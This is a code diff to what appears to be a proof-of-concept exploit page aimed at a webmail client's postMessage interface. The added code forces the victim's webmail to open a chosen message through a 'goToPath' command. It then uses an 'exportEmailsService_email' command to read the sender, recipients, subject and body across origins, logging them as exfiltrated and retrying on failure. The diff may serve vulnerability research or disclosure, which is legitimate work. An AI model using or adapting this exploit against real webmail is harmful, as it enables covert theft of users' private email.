@@ -249,8 +249,17 @@ async function readEmail() {
 
   setStatus('<span class="info">&#9654; Reading email content (ID: ' + firstEmailId + ')...</span>');
   log('\n<span class="info">══════════ STEP 6: READING EMAIL CONTENT ══════════</span>');
-  log('<span class="info">[*] Note: Email must be currently loaded in the webmail reader.</span>');
 
+  // Step A: Force victim webmail to open the email using goToPath
+  log('<span class="info">[*] Sending goToPath to force-open email in victim webmail...</span>');
+  wmWindow.postMessage({ cmd: 'goToPath', path: '/webmail/0//INBOX/page:1/' + firstEmailId }, '*');
+
+  // Wait for email to load in the reader
+  log('<span class="info">[*] Waiting 4s for email to load in reader...</span>');
+  await new Promise(r => setTimeout(r, 4000));
+
+  // Step B: Now exfiltrate the email content
+  log('<span class="info">[*] Sending exportEmailsService_email to read content...</span>');
   try {
     const data = await sendCommand('exportEmailsService_email',
       { accountId: 0, folderId: 'INBOX', emailId: firstEmailId },
@@ -260,24 +269,56 @@ async function readEmail() {
     const email = data.exported.email;
 
     if (email && email.id) {
+      // Extract plain text from HTML body
+      const div = document.createElement('div');
+      div.innerHTML = email.body || '';
+      const textContent = (div.textContent || div.innerText || '').replace(/\s+/g, ' ').trim();
+
       log('<span class="ok">[+] EMAIL CONTENT EXFILTRATED!</span>');
       log('');
       log('<div class="email-card">' +
-        '<span class="sensitive">FULL EMAIL CONTENT:</span><br>' +
+        '<span class="sensitive">FULL EMAIL CONTENT READ CROSS-ORIGIN:</span><br><br>' +
         '<span class="from">From: ' + (email.from || 'N/A') + '</span><br>' +
         '<span class="from">To: ' + (email.to || 'N/A') + '</span><br>' +
         '<span class="subject">Subject: ' + (email.subject || 'N/A') + '</span><br>' +
         '<span class="date">Date: ' + (email.datetime || 'N/A') + '</span><br>' +
         '<span class="date">CC: ' + (email.cc || 'none') + ' | BCC: ' + (email.bcc || 'none') + '</span><br>' +
-        '<span class="date">Size: ' + (email.size || 'N/A') + ' | Attachments: ' + ((email.attachments || []).length) + '</span>' +
-        '<div class="body-preview"><strong>Body (first 500 chars):</strong><br>' +
-        (email.body || '').replace(/</g, '&lt;').replace(/>/g, '&gt;').substring(0, 500) + '...</div>' +
+        '<span class="date">Size: ' + (email.size || 'N/A') + ' | Attachments: ' + ((email.attachments || []).length) + '</span><br>' +
+        '<span class="date">HTML Body Length: ' + (email.body || '').length + ' chars</span>' +
+        '<div class="body-preview"><strong>Email Text Content:</strong><br>' +
+        textContent.substring(0, 800) + (textContent.length > 800 ? '...' : '') + '</div>' +
         '</div>');
 
-      setStatus('<span class="ok">&#10004; Full email content exfiltrated including HTML body!</span>');
+      setStatus('<span class="ok">&#10004; Full email content exfiltrated! Body: ' + (email.body || '').length + ' chars of HTML</span>');
     } else {
-      log('<span class="info">[*] Email not currently loaded in reader. Navigate to an email in the popup first.</span>');
-      setStatus('<span class="info">Open an email in the webmail popup, then click "Read Email" again.</span>');
+      log('<span class="err">[!] Email body empty. The email may not have fully loaded.</span>');
+      log('<span class="info">[*] Retrying in 3s...</span>');
+      await new Promise(r => setTimeout(r, 3000));
+      // Retry once
+      try {
+        const retry = await sendCommand('exportEmailsService_email',
+          { accountId: 0, folderId: 'INBOX', emailId: firstEmailId },
+          'exportedEmailsService_email');
+        const em2 = retry.exported.email;
+        if (em2 && em2.id) {
+          const div2 = document.createElement('div');
+          div2.innerHTML = em2.body || '';
+          const text2 = (div2.textContent || div2.innerText || '').replace(/\s+/g, ' ').trim();
+          log('<span class="ok">[+] RETRY SUCCESS - EMAIL CONTENT EXFILTRATED!</span>');
+          log('<div class="email-card">' +
+            '<span class="sensitive">FULL EMAIL CONTENT:</span><br><br>' +
+            '<span class="from">From: ' + (em2.from || 'N/A') + '</span><br>' +
+            '<span class="subject">Subject: ' + (em2.subject || 'N/A') + '</span><br>' +
+            '<div class="body-preview"><strong>Email Text:</strong><br>' +
+            text2.substring(0, 800) + '</div></div>');
+          setStatus('<span class="ok">&#10004; Email content read on retry!</span>');
+        } else {
+          log('<span class="err">[!] Retry also returned empty. Try clicking "Read Email" again.</span>');
+          setStatus('<span class="err">Email still empty. Click "6. Read Email" to retry.</span>');
+        }
+      } catch(e2) {
+        log('<span class="err">[!] Retry failed: ' + e2.message + '</span>');
+      }
     }
   } catch(e) {
     log('<span class="err">[!] Failed: ' + e.message + '</span>');
